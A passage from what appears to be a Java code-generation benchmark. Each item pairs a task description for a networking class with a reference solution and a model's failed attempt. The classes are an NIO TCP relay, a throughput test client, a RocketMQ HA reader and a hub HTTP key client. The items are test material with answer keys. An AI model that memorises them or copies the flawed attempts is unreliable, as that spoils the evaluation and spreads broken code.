Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader]) -> [void] - Constructor that initializes the connection with necessary headers and registers the channel with the selector\n- disconnect() -> [void] - Closes the connection and releases resources\n- processReceive() -> [void] - Handles incoming data from the network when readable\n- processSend() -> [void] - Handles outgoing data to the network when writable\n- createChannel() -> [SocketChannel] - Creates and configures the socket channel\n- sendToNetwork([IPv4Packet packet]) -> [void] - Sends a packet to the network\n- updateInterests() -> [void] - Updates the selector's interest ops based on current state\n- mayRead() -> [boolean] - Determines if the channel should be registered for read operations\n- mayWrite() -> [boolean] - Determines if the channel should be registered for write operations\n- mayConnect() -> [boolean] - Determines if the channel is in connecting state",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPConnection extends AbstractConnection implements PacketSource {\n\n    private static final int MTU = 0x4000;\n    private static final int MAX_PAYLOAD_SIZE = MTU - 20 - 20;\n\n    private final StreamBuffer clientToNetwork = new StreamBuffer(4 * IPv4Packet.MAX_PACKET_LENGTH);\n    private final Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n\n    private final SocketChannel channel;\n    private final SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) throws IOException {\n        super(id, client);\n\n        TCPHeader shrinkedTcpHeader = tcpHeader.copy();\n        shrinkedTcpHeader.shrinkOptions();\n\n        networkToClient = new Packetizer(ipv4Header, shrinkedTcpHeader);\n        networkToClient.getResponseIPv4Header().swapSourceAndDestination();\n        networkToClient.getResponseTransportHeader().swapSourceAndDestination();\n\n        SelectionHandler selectionHandler = (selectionKey) -> {\n            if (selectionKey.isValid() && selectionKey.isConnectable()) {\n                processConnect();\n            }\n            if (selectionKey.isValid() && selectionKey.isReadable()) {\n                processReceive();\n            }\n            if (selectionKey.isValid() && selectionKey.isWritable()) {\n                processSend();\n            }\n            updateInterests();\n        };\n        channel = createChannel();\n        interests = SelectionKey.OP_CONNECT;\n        selectionKey = channel.register(selector, interests, selectionHandler);\n    }\n\n    @Override\n    public void disconnect() {\n        selectionKey.cancel();\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private void processReceive() {\n        try {\n            assert packetForClient == null;\n            int remainingClientWindow = getRemainingClientWindow();\n            assert remainingClientWindow > 0;\n            int maxPayloadSize = Math.min(remainingClientWindow, MAX_PAYLOAD_SIZE);\n            updateHeaders(TCPHeader.FLAG_ACK | TCPHeader.FLAG_PSH);\n            packetForClient = networkToClient.packetize(channel, maxPayloadSize);\n            if (packetForClient == null) {\n                eof();\n                return;\n            }\n            consume(this);\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private void processSend() {\n        try {\n            int w = clientToNetwork.writeTo(channel);\n            if (w > 0) {\n                acknowledgementNumber += w;\n\n                if (finReceived && clientToNetwork.isEmpty()) {\n                    doHandleFin();\n                } else {\n                    sendEmptyPacketToClient(TCPHeader.FLAG_ACK);\n                }\n            } else {\n                close();\n            }\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private SocketChannel createChannel() throws IOException {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(getRewrittenDestination());\n        return socketChannel;\n    }\n\n    @Override\n    public void sendToNetwork(IPv4Packet packet) {\n        handlePacket(packet);\n        updateInterests();\n    }\n\n    protected void updateInterests() {\n        if (!selectionKey.isValid()) {\n            return;\n        }\n        int interestOps = 0;\n        if (mayRead()) {\n            interestOps |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            interestOps |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            interestOps |= SelectionKey.OP_CONNECT;\n        }\n        if (interests != interestOps) {\n            interests = interestOps;\n            selectionKey.interestOps(interestOps);\n        }\n    }\n\n    private boolean mayRead() {\n        if (!state.isConnected() || state.isClosed()) {\n            return false;\n        }\n        if (packetForClient != null) {\n            return false;\n        }\n        return getRemainingClientWindow() > 0;\n    }\n\n    private boolean mayWrite() {\n        return !clientToNetwork.isEmpty();\n    }\n\n    private boolean mayConnect() {\n        return state == State.SYN_SENT;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class TCPConnection {\n    private final ConnectionId id;\n    private final Client client;\n    private final Selector selector;\n    private final IPv4Header ipv4Header;\n    private final TCPHeader tcpHeader;\n    private final int MTU;\n    private final int MAX_PAYLOAD_SIZE;\n    private final StreamBuffer clientToNetwork;\n    private final Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n    private SocketChannel channel;\n    private SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) {\n        this.id = id;\n        this.client = client;\n        this.selector = selector;\n        this.ipv4Header = ipv4Header;\n        this.tcpHeader = tcpHeader;\n        this.MTU = 16384;\n        this.MAX_PAYLOAD_SIZE = 1460; // Example value\n        this.clientToNetwork = new StreamBuffer();\n        this.networkToClient = new Packetizer();\n        this.channel = createChannel();\n        this.selectionKey = channel.register(selector, 0);\n        this.interests = 0;\n    }\n\n    public void disconnect() {\n        try {\n            if (channel != null) {\n                channel.close();\n                if (selectionKey != null) {\n                    selectionKey.cancel();\n                }\n            }\n        } catch (IOException e) {\n            client.onError(e);\n        }\n    }\n\n    public void processReceive() {\n        try {\n            int bytesRead = channel.read(networkToClient.getBuffer());\n            if (bytesRead > 0) {\n                networkToClient.processData();\n                while ((packetForClient = networkToClient.getNextPacket()) != null) {\n                    client.onPacketReceived(packetForClient);\n                }\n            }\n        } catch (IOException e) {\n            client.onError(e);\n        }\n    }\n\n    public void processSend() {\n        if (!clientToNetwork.isEmpty()) {\n            int bytesSent = channel.write(clientToNetwork.getBuffer());\n            if (bytesSent == 0) {\n                // Handle connection reset or flow control\n            }\n            if (clientToNetwork.isEmpty()) {\n                updateInterests();\n            }\n        }\n    }\n\n    public SocketChannel createChannel() {\n        try {\n            SocketChannel channel = SocketChannel.open();\n            channel.configureBlocking(false);\n            channel.connect(new InetSocketAddress(\"example.com\", 80));\n            return channel;\n        } catch (IOException e) {\n            client.onError(e);\n            return null;\n        }\n    }\n\n    public void sendToNetwork(IPv4Packet packet) {\n        clientToNetwork.addPacket(packet);\n        updateInterests();\n    }\n\n    public void updateInterests() {\n        int newInterests = 0;\n        if (mayRead()) newInterests |= OP_READ;\n        if (mayWrite()) newInterests |= OP_WRITE;\n        if (mayConnect()) newInterests |= OP_CONNECT;\n        selectionKey.interestOps(newInterests);\n    }\n\n    public boolean mayRead() {\n        return !networkToClient.isEmpty();\n    }\n\n    public boolean mayWrite() {\n        return !clientToNetwork.isEmpty();\n    }\n\n    public boolean mayConnect() {\n        return channel.finishConnect();\n    }\n}"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) to send messages to a server. The client should support multiple sender threads, track total bytes and messages sent, and allow for both direct and heap byte buffers.\n\nClass Description: NioClientTest is a TCP client implementation that uses Java NIO's SocketChannel to communicate with a server. It manages multiple sender threads, tracks performance metrics, and provides interactive control via console input.\n\nAttributes:\n- running: boolean - Flag to control the main loop's execution\n- total_bytes_sent: LongAdder - Counter for total bytes sent to the server\n- total_msgs: LongAdder - Counter for total messages sent to the server\n- senders: Sender[] - Array of sender threads\n\nMethods:\n- create(int size, boolean direct) -> ByteBuffer - Creates a new ByteBuffer with specified size and type (direct or heap)\n- start(InetAddress host, boolean direct, int num_threads) -> void - Main method to start the client and handle user input\n- sendMessages(InetAddress host, boolean direct, int num_threads) -> void - Creates and starts sender threads\n- Sender(InetAddress host, boolean direct, CountDownLatch latch) -> void - Constructor for the inner Sender class\n- run() -> void - The Sender thread's main execution method (connects to server and sends data)\n\nInner Class: Sender extends Thread\nAttributes:\n- ch: SocketChannel - The channel used for communication\n- latch: CountDownLatch - Synchronization aid for thread coordination\n- host: InetAddress - The server's host address\n- direct: boolean - Flag for buffer type (direct or heap)\n- buf: ByteBuffer - The buffer used for message data\n\nMethods:\n- run() -> void - Connects to server, waits for latch, then sends messages until byte limit is reached",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.LongAdder;\n\npublic class NioClientTest {\n    protected volatile boolean running=true;\n    protected final LongAdder total_bytes_sent=new LongAdder();\n    protected final LongAdder total_msgs=new LongAdder();\n    protected Sender[] senders;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(InetAddress host, boolean direct, int num_threads) throws Exception {\n        boolean looping=true;\n        while(looping) {\n            int c=Util.keyPress(\"[1] send [x] exit\");\n            switch(c) {\n                case '1':\n                    sendMessages(host, direct, num_threads);\n                    break;\n                case 'x':\n                case -1:\n                    looping=false;\n                    break;\n            }\n        }\n    }\n\n    protected void sendMessages(InetAddress host, boolean direct, int num_threads) throws Exception {\n        total_msgs.reset();\n        total_bytes_sent.reset();\n        senders=new Sender[num_threads];\n        final CountDownLatch latch=new CountDownLatch(1);\n        for(int i=0; i < senders.length; i++)\n            senders[i]=new Sender(host, direct, latch);\n        for(Sender sender: senders)\n            sender.start();\n        latch.countDown();\n        for(Sender sender: senders)\n            sender.join();\n    }\n\n    protected class Sender extends Thread {\n        protected SocketChannel ch;\n        protected final CountDownLatch latch;\n        protected final InetAddress host;\n        protected final boolean direct;\n        protected final ByteBuffer buf;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) {\n            this.latch=latch;\n            this.host=host;\n            this.direct=direct;\n            buf=create(NioServerPerfTest.SIZE, direct);\n        }\n\n        public void run() {\n            try {\n                ch=SocketChannel.open();\n                ch.configureBlocking(true);\n                ch.connect(new InetSocketAddress(host, 7500));\n                latch.await();\n            }\n            catch(Exception e) {\n                e.printStackTrace();\n            }\n            for(;;) {\n                total_bytes_sent.add(NioServerPerfTest.SIZE);\n                if(total_bytes_sent.sum() > NioServerPerfTest.BYTES_TO_SEND)\n                    break;\n                buf.rewind();\n                try {\n                    ch.write(buf);\n                    total_msgs.increment();\n                }\n                catch(IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(ch);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class NioClientTest {\n    private volatile boolean running = true;\n    private final LongAdder totalBytesSent = new LongAdder();\n    private final LongAdder totalMessagesSent = new LongAdder();\n    private Sender[] senders;\n\n    public ByteBuffer create(int size, boolean direct) {\n        return direct ? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    public void start(InetAddress host, boolean direct, int numThreads) {\n        senders = new Sender[numThreads];\n        CountDownLatch latch = new CountDownLatch(numThreads);\n        for (int i = 0; i < numThreads; i++) {\n            senders[i] = new Sender(host, direct, latch);\n        }\n        for (Sender sender : senders) {\n            sender.start();\n        }\n        try {\n            latch.await();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return;\n        }\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter 'quit' to stop the client:\");\n        while (running) {\n            if (scanner.hasNextLine()) {\n                String input = scanner.nextLine();\n                if (input.trim().equalsIgnoreCase(\"quit\")) {\n                    running = false;\n                    for (Sender sender : senders) {\n                        sender.interrupt();\n                    }\n                    try {\n                        for (Sender sender : senders) {\n                            sender.join();\n                        }\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    System.out.println(\"Total bytes sent: \" + totalBytesSent.longValue());\n                    System.out.println(\"Total messages sent: \" + totalMessagesSent.longValue());\n                    break;\n                }\n            }\n        }\n    }\n\n    private class Sender extends Thread {\n        private final InetAddress host;\n        private final boolean direct;\n        private final CountDownLatch latch;\n        private SocketChannel channel;\n        private ByteBuffer buffer;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) {\n            this.host = host;\n            this.direct = direct;\n            this.latch = latch;\n            this.buffer = create(1024, direct);\n        }\n\n        @Override\n        public void run() {\n            try {\n                channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                channel.connect(new InetSocketAddress(host, 12345));\n                latch.countDown();\n                latch.await();\n                while (running) {\n                    buffer.clear();\n                    buffer.put(\"Hello, Server!\".getBytes());\n                    buffer.flip();\n                    while (buffer.hasRemaining()) {\n                        if (channel.write(buffer) == 0) {\n                            break;\n                        }\n                    }\n                    totalBytesSent.add(buffer.remaining());\n                    totalMessagesSent.increment();\n                    if (totalBytesSent.longValue() >= 1024 * 1024) {\n                        break;\n                    }\n                }\n            } catch (IOException | InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (channel != null) {\n                        channel.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public void sendMessages(InetAddress host, boolean direct, int numThreads) {\n        // Not used in the current implementation\n    }\n}"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a Java class that handles reading data from a SocketChannel using Java NIO (Non-blocking I/O) for high-availability (HA) communication in a distributed messaging system.\n\nClass Description: ReadSocketService is a service thread that continuously reads data from a SocketChannel using a Selector and ByteBuffer. It processes incoming HA protocol messages (handshake and transfer states) and manages connection state. The class integrates with a high-availability service to maintain synchronization between master and slave nodes.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Constant defining the maximum buffer size for reading (1MB)\n- selector: [Selector] - NIO Selector for monitoring the SocketChannel\n- socketChannel: [SocketChannel] - The channel for communication with the remote peer\n- byteBufferRead: [ByteBuffer] - Buffer for storing read data\n- haReader: [AbstractHAReader] - Reader implementation for processing HA protocol messages\n- processPosition: [int] - Current processing position within the read buffer\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n\nMethods:\n- ReadSocketService([SocketChannel socketChannel]) -> [void] - Constructor that initializes the selector, configures the socket channel, and sets up the HA reader\n- run() -> [void] - Main service loop that performs selector operations, reads data, and handles connection state\n- getServiceName() -> [String] - Returns the service name with broker identifier if in container mode\n- HAServerReader.processReadResult([ByteBuffer byteBufferRead]) -> [boolean] - Processes the read buffer according to HA protocol (handshake and transfer states), returns true if processing succeeds\n\nThe class should handle connection timeouts, buffer management (including compaction), and proper resource cleanup when stopping. It should integrate with a parent HA connection service for state management and notification.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.ha.io.AbstractHAReader;\nimport org.apache.rocketmq.store.ha.io.HAWriter;\n\nclass ReadSocketService extends ServiceThread {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private final AbstractHAReader haReader;\n    private int processPosition = 0;\n    private volatile long lastReadTimestamp = System.currentTimeMillis();\n\n    public ReadSocketService(final SocketChannel socketChannel) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.socketChannel = socketChannel;\n        this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n        this.setDaemon(true);\n        haReader = new HAServerReader();\n        haReader.registerHook(readSize -> {\n            if (readSize > 0) {\n                ReadSocketService.this.lastReadTimestamp =\n                    haService.getDefaultMessageStore().getSystemClock().now();\n            }\n        });\n    }\n\n    @Override\n    public void run() {\n        LOGGER.info(this.getServiceName() + \" service started\");\n\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                boolean ok = this.haReader.read(this.socketChannel, this.byteBufferRead);\n                if (!ok) {\n                    AutoSwitchHAConnection.LOGGER.error(\"processReadEvent error\");\n                    break;\n                }\n\n                long interval = haService.getDefaultMessageStore().getSystemClock().now() - this.lastReadTimestamp;\n                if (interval > haService.getDefaultMessageStore().getMessageStoreConfig().getHaHousekeepingInterval()) {\n                    LOGGER.warn(\"ha housekeeping, found this connection[\" + clientAddress + \"] expired, \" + interval);\n                    break;\n                }\n            } catch (Exception e) {\n                AutoSwitchHAConnection.LOGGER.error(this.getServiceName() + \" service has exception.\", e);\n                break;\n            }\n        }\n\n        this.makeStop();\n\n        changeCurrentState(HAConnectionState.SHUTDOWN);\n\n        writeSocketService.makeStop();\n\n        haService.removeConnection(AutoSwitchHAConnection.this);\n\n        haService.getConnectionCount().decrementAndGet();\n\n        SelectionKey sk = this.socketChannel.keyFor(this.selector);\n        if (sk != null) {\n            sk.cancel();\n        }\n\n        try {\n            this.selector.close();\n            this.socketChannel.close();\n        } catch (IOException e) {\n            AutoSwitchHAConnection.LOGGER.error(\"\", e);\n        }\n\n        flowMonitor.shutdown(true);\n\n        AutoSwitchHAConnection.LOGGER.info(this.getServiceName() + \" service end\");\n    }\n\n    @Override\n    public String getServiceName() {\n        if (haService.getDefaultMessageStore().getBrokerConfig().isInBrokerContainer()) {\n            return haService.getDefaultMessageStore().getBrokerIdentity().getIdentifier() + ReadSocketService.class.getSimpleName();\n        }\n        return ReadSocketService.class.getSimpleName();\n    }\n\n    class HAServerReader extends AbstractHAReader {\n        @Override\n        protected boolean processReadResult(ByteBuffer byteBufferRead) {\n            while (true) {\n                boolean processSuccess = true;\n                int readSocketPos = byteBufferRead.position();\n                int diff = byteBufferRead.position() - ReadSocketService.this.processPosition;\n                if (diff >= AutoSwitchHAClient.MIN_HEADER_SIZE) {\n                    int readPosition = ReadSocketService.this.processPosition;\n                    HAConnectionState slaveState = HAConnectionState.values()[byteBufferRead.getInt(readPosition)];\n\n                    switch (slaveState) {\n                        case HANDSHAKE:\n                            Long slaveBrokerId = byteBufferRead.getLong(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 8);\n                            AutoSwitchHAConnection.this.slaveId = slaveBrokerId;\n                            short syncFromLastFileFlag = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 12);\n                            if (syncFromLastFileFlag == 1) {\n                                AutoSwitchHAConnection.this.isSyncFromLastFile = true;\n                            }\n                            short isAsyncLearner = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 10);\n                            if (isAsyncLearner == 1) {\n                                AutoSwitchHAConnection.this.isAsyncLearner = true;\n                            }\n\n                            isSlaveSendHandshake = true;\n                            byteBufferRead.position(readSocketPos);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE;\n                            LOGGER.info(\"Receive slave handshake, slaveBrokerId:{}, isSyncFromLastFile:{}, isAsyncLearner:{}\",\n                                AutoSwitchHAConnection.this.slaveId, AutoSwitchHAConnection.this.isSyncFromLastFile, AutoSwitchHAConnection.this.isAsyncLearner);\n                            break;\n                        case TRANSFER:\n                            long slaveMaxOffset = byteBufferRead.getLong(readPosition + 4);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.TRANSFER_HEADER_SIZE;\n\n                            AutoSwitchHAConnection.this.slaveAckOffset = slaveMaxOffset;\n                            if (slaveRequestOffset < 0) {\n                                slaveRequestOffset = slaveMaxOffset;\n                            }\n                            byteBufferRead.position(readSocketPos);\n                            maybeExpandInSyncStateSet(slaveMaxOffset);\n                            AutoSwitchHAConnection.this.haService.updateConfirmOffsetWhenSlaveAck(AutoSwitchHAConnection.this.slaveId);\n                            AutoSwitchHAConnection.this.haService.notifyTransferSome(AutoSwitchHAConnection.this.slaveAckOffset);\n                            break;\n                        default:\n                            LOGGER.error(\"Current state illegal {}\", currentState);\n                            return false;\n                    }\n\n                    if (!slaveState.equals(currentState)) {\n                        LOGGER.warn(\"Master change state from {} to {}\", currentState, slaveState);\n                        changeCurrentState(slaveState);\n                    }\n                    if (processSuccess) {\n                        continue;\n                    }\n                }\n\n                if (!byteBufferRead.hasRemaining()) {\n                    byteBufferRead.position(ReadSocketService.this.processPosition);\n                    byteBufferRead.compact();\n                    ReadSocketService.this.processPosition = 0;\n                }\n                break;\n            }\n\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class ReadSocketService {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead;\n    private final AbstractHAReader haReader;\n    private int processPosition;\n    private long lastReadTimestamp;\n    private volatile boolean running;\n\n    public ReadSocketService(SocketChannel socketChannel) throws IOException {\n        this.socketChannel = socketChannel;\n        this.socketChannel.configureBlocking(false);\n        this.selector = Selector.open();\n        this.byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        this.haReader = new AbstractHAReader();\n        this.processPosition = 0;\n        this.lastReadTimestamp = System.currentTimeMillis();\n        this.running = true;\n        registerChannel();\n    }\n\n    private void registerChannel() throws IOException {\n        socketChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    public void run() {\n        while (running) {\n            try {\n                selector.select();\n                if (selector.selectedKeys().isEmpty()) {\n                    continue;\n                }\n\n                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n                while (keys.hasNext()) {\n                    SelectionKey key = keys.next();\n                    if (key.isReadable()) {\n                        int bytesRead = socketChannel.read(byteBufferRead);\n                        if (bytesRead > 0) {\n                            byteBufferRead.flip();\n                            boolean processed = haReader.processReadResult(byteBufferRead);\n                            if (processed) {\n                                byteBufferRead.compact();\n                                processPosition = 0;\n                                lastReadTimestamp = System.currentTimeMillis();\n                            } else {\n                                closeConnection();\n                            }\n                            byteBufferRead.flip();\n                        }\n                        keys.remove();\n                    }\n                }\n            } catch (IOException e) {\n                closeConnection();\n            }\n\n            if (System.currentTimeMillis() - lastReadTimestamp > 30000) {\n                closeConnection();\n            }\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            if (socketChannel != null && socketChannel.isOpen()) {\n                socketChannel.close();\n            }\n            if (selector != null) {\n                selector.close();\n            }\n            running = false;\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public String getServiceName() {\n        return \"ReadSocketService\";\n    }\n\n    public void stop() {\n        running = false;\n    }\n}"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for interacting with a hub API, handling authentication, and processing various API responses to retrieve encryption keys.\n\nClass Description: The HubHttpClient class provides functionality to communicate with a hub API, manage authentication using bearer tokens, and handle different API response scenarios to retrieve encryption keys. It supports both modern and legacy API versions.\n\nAttributes:\n\nhttpClient: [HttpClient] - The HTTP client instance used for making requests\nbearerToken: [String] - The bearer token used for authentication\nhubConfig: [HubConfig] - Configuration containing API URIs\ndeviceId: [String] - Identifier for the device making requests\nvaultId: [String] - Identifier for the vault being accessed\n\nMethods:\n\nconstructor: [HubHttpClient]([ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId]) -> [void] - Initializes the HTTP client with configuration and authentication details\nrequestApiConfig: [requestApiConfig]() -> [CompletableFuture<ReceivedKey>] - Initiates the API configuration request chain\nhandleApiConfigResponse: [handleApiConfigResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the API configuration response\nrequestDeviceData: [requestDeviceData]() -> [CompletableFuture<ReceivedKey>] - Requests device-specific data from the API\nhandleDeviceDataResponse: [handleDeviceDataResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the device data response\nrequestVaultMasterkey: [requestVaultMasterkey]([String encryptedUserKey]) -> [CompletableFuture<ReceivedKey>] - Requests the vault master key\nhandleVaultMasterkeyResponse: [handleVaultMasterkeyResponse]([String encryptedUserKey, HttpResponse<String> response]) -> [ReceivedKey] - Processes the vault master key response\nrequestLegacyAccessToken: [requestLegacyAccessToken]() -> [CompletableFuture<ReceivedKey>] - Requests a legacy access token\nhandleLegacyAccessTokenResponse: [handleLegacyAccessTokenResponse]([HttpResponse<String> response]) -> [ReceivedKey] - Processes the legacy access token response\nretrievalFailed: [retrievalFailed]([Throwable cause]) -> [ReceivedKey] - Handles request failures",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.common.base.Preconditions;\nimport com.nimbusds.jose.JWEObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.text.ParseException;\nimport java.time.Duration;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(HubHttpClient.class);\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final Duration REQ_TIMEOUT = Duration.ofSeconds(10);\n\n\tprivate final HttpClient httpClient;\n\tprivate final String bearerToken;\n\tprivate final HubConfig hubConfig;\n\tprivate final String deviceId;\n\tprivate final String vaultId;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken);\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.vaultId = vaultId;\n\t}\n\n\tpublic CompletableFuture<ReceivedKey> requestApiConfig() {\n\t\tvar configUri = hubConfig.URIs.API.resolve(\"config\");\n\t\tvar request = HttpRequest.newBuilder(configUri)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenCompose(this::handleApiConfigResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tPreconditions.checkState(response.statusCode() == 200, \"Unexpected response \" + response.statusCode());\n\t\ttry {\n\t\t\tvar config = JSON.reader().readValue(response.body(), ConfigDto.class);\n\t\t\tif (config.apiLevel >= 1) {\n\t\t\t\treturn requestDeviceData();\n\t\t\t} else {\n\t\t\t\treturn requestLegacyAccessToken();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestDeviceData() {\n\t\tvar deviceUri = hubConfig.URIs.API.resolve(\"devices/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8))\n\t\t\t\t.thenCompose(this::handleDeviceDataResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\ttry {\n\t\t\tswitch (response.statusCode()) {\n\t\t\t\tcase 200 -> {\n\t\t\t\t\tvar device = JSON.reader().readValue(response.body(), DeviceDto.class);\n\t\t\t\t\treturn requestVaultMasterkey(device.userPrivateKey);\n\t\t\t\t}\n\t\t\t\tdefault -> throw new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n\t\tvar vaultKeyUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/access-token\");\n\t\tvar request = HttpRequest.newBuilder(vaultKeyUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(response -> handleVaultMasterkeyResponse(encryptedUserKey, response))\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tif (response.statusCode() == 200) {\n\t\t\ttry {\n\t\t\t\tvar vaultKeyJwe = JWEObject.parse(response.body());\n\t\t\t\tvar userKeyJwe = JWEObject.parse(encryptedUserKey);\n\t\t\t\treturn 